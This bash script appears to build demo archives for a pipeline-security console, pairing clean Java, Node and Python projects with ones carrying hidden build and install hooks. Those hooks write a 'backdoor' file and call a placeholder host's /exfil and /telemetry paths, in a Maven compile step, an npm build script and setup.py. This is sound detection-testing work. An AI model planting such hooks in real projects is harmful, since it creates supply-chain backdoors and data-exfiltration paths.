#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ARTIFACTS_DIR="$SCRIPT_DIR/artifacts"
mkdir -p "$ARTIFACTS_DIR"

echo "============================================================"
echo " PIPEJACK DEMO CONSOLE — ARTIFACT PREPARATION"
echo "============================================================"

# 1. Clean Java Bundle (Banking API)
TMP_DIR=$(mktemp -d)
mkdir -p "$TMP_DIR/src/main/java/com/pipejack/banking"
cat << 'EOF' > "$TMP_DIR/pom.xml"
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2000/svg-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.pipejack</groupId>
  <artifactId>banking</artifactId>
  <version>1.0.0</version>
  <properties>
    <maven.compiler.source>17</maven.compiler.source>
    <maven.compiler.target>17</maven.compiler.target>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
  </properties>
</project>
EOF
cat << 'EOF' > "$TMP_DIR/src/main/java/com/pipejack/banking/AccountController.java"
package com.pipejack.banking;
public class AccountController {
    public static void main(String[] args) {
        System.out.println("Banking API Service - Production Build Online");
    }
}
EOF
tar -czf "$ARTIFACTS_DIR/clean-java.tar.gz" -C "$TMP_DIR" .
rm -rf "$TMP_DIR"
echo "  [+] Built $ARTIFACTS_DIR/clean-java.tar.gz"

# 2. Malicious Java Bundle (Hero Demo: Process curl + FS tamper + Network egress)
TMP_DIR=$(mktemp -d)
mkdir -p "$TMP_DIR/src/main/java/com/pipejack/banking"
cat << 'EOF' > "$TMP_DIR/pom.xml"
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2000/svg-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.pipejack</groupId>
  <artifactId>banking</artifactId>
  <version>1.0.0</version>
  <properties>
    <maven.compiler.source>17</maven.compiler.source>
    <maven.compiler.target>17</maven.compiler.target>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
  </properties>
  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>exec-maven-plugin</artifactId>
        <version>3.1.0</version>
        <executions>
          <execution>
            <phase>compile</phase>
            <goals>
              <goal>exec</goal>
            </goals>
            <configuration>
              <executable>sh</executable>
              <arguments>
                <argument>-c</argument>
                <argument>echo 'injected_backdoor' > src/main/java/com/pipejack/banking/backdoor.txt &amp;&amp; /usr/bin/curl -s --connect-timeout 1 http://10.255.255.1:80/exfil || true</argument>
              </arguments>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
EOF
cat << 'EOF' > "$TMP_DIR/src/main/java/com/pipejack/banking/AccountController.java"
package com.pipejack.banking;
public class AccountController {
    public static void main(String[] args) {
        System.out.println("Banking API Service");
    }
}
EOF
tar -czf "$ARTIFACTS_DIR/malicious-java.tar.gz" -C "$TMP_DIR" .
rm -rf "$TMP_DIR"
echo "  [+] Built $ARTIFACTS_DIR/malicious-java.tar.gz"

# 3. Malicious Node.js Bundle (Network Egress)
TMP_DIR=$(mktemp -d)
cat << 'EOF' > "$TMP_DIR/package.json"
{
  "name": "payment-service",
  "version": "1.0.0",
  "scripts": {
    "build": "node -e 'const http = require(\"http\"); const req = http.request({host: \"10.255.255.1\", port: 80, path: \"/exfil\"}); req.on(\"error\", () => {}); req.end(); setTimeout(() => { console.log(\"[EXPLOIT] Outbound egress socket to 10.255.255.1:80 dropped by firewall\"); process.exit(0); }, 1200);'",
    "test": "echo 'running tests'"
  },
  "main": "index.js"
}
EOF
cat << 'EOF' > "$TMP_DIR/index.js"
console.log("Payment service component");
EOF
tar -czf "$ARTIFACTS_DIR/malicious-node.tar.gz" -C "$TMP_DIR" .
rm -rf "$TMP_DIR"
echo "  [+] Built $ARTIFACTS_DIR/malicious-node.tar.gz"

# 4. Malicious Python Bundle (In-Memory Setup Hook Egress)
TMP_DIR=$(mktemp -d)
cat << 'EOF' > "$TMP_DIR/requirements.txt"
# Dependencies
EOF
cat << 'EOF' > "$TMP_DIR/setup.py"
import urllib.request
from setuptools import setup

try:
    urllib.request.urlopen("http://10.255.255.1:80/telemetry", timeout=1)
except Exception:
    pass

setup(
    name="analytics-core",
    version="1.0.0",
    py_modules=["analytics"]
)
EOF
cat << 'EOF' > "$TMP_DIR/analytics.py"
print("Analytics engine")
EOF
tar -czf "$ARTIFACTS_DIR/malicious-python.tar.gz" -C "$TMP_DIR" .
rm -rf "$TMP_DIR"
echo "  [+] Built $ARTIFACTS_DIR/malicious-python.tar.gz"

# 5. Clean Node.js Bundle
TMP_DIR=$(mktemp -d)
cat << 'EOF' > "$TMP_DIR/package.json"
{
  "name": "auth-service",
  "version": "1.0.0",
  "scripts": {
    "build": "echo 'building auth service...'",
    "test": "echo 'testing auth service...'"
  },
  "main": "index.js"
}
EOF
cat << 'EOF' > "$TMP_DIR/index.js"
console.log("Authentication service");
EOF
tar -czf "$ARTIFACTS_DIR/clean-node.tar.gz" -C "$TMP_DIR" .
rm -rf "$TMP_DIR"
echo "  [+] Built $ARTIFACTS_DIR/clean-node.tar.gz"

# 6. Clean Python Bundle
TMP_DIR=$(mktemp -d)
cat << 'EOF' > "$TMP_DIR/requirements.txt"
# Standard requirements
EOF
cat << 'EOF' > "$TMP_DIR/app.py"
print("Clean Python microservice")
EOF
tar -czf "$ARTIFACTS_DIR/clean-python.tar.gz" -C "$TMP_DIR" .
rm -rf "$TMP_DIR"
echo "  [+] Built $ARTIFACTS_DIR/clean-python.tar.gz"

# 7. Anomaly Bundle (Behavioral Deviation)
TMP_DIR=$(mktemp -d)
mkdir -p "$TMP_DIR/src/main/java/com/pipejack/banking"
cat << 'EOF' > "$TMP_DIR/pom.xml"
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2000/svg-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.pipejack</groupId>
  <artifactId>banking</artifactId>
  <version>1.0.0</version>
  <properties>
    <maven.compiler.source>17</maven.compiler.source>
    <maven.compiler.target>17</maven.compiler.target>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
  </properties>
  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>exec-maven-plugin</artifactId>
        <version>3.1.0</version>
        <executions>
          <execution>
            <phase>compile</phase>
            <goals>
              <goal>exec</goal>
            </goals>
            <configuration>
              <executable>/usr/bin/cat</executable>
              <arguments>
                <argument>pom.xml</argument>
              </arguments>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
EOF
cat << 'EOF' > "$TMP_DIR/src/main/java/com/pipejack/banking/AccountController.java"
package com.pipejack.banking;
public class AccountController {
    public static void main(String[] args) {
        System.out.println("Banking API Service");
    }
}
EOF
tar -czf "$ARTIFACTS_DIR/anomaly-demo.tar.gz" -C "$TMP_DIR" .
rm -rf "$TMP_DIR"
echo "  [+] Built $ARTIFACTS_DIR/anomaly-demo.tar.gz"

echo "============================================================"
echo " Artifact preparation complete."
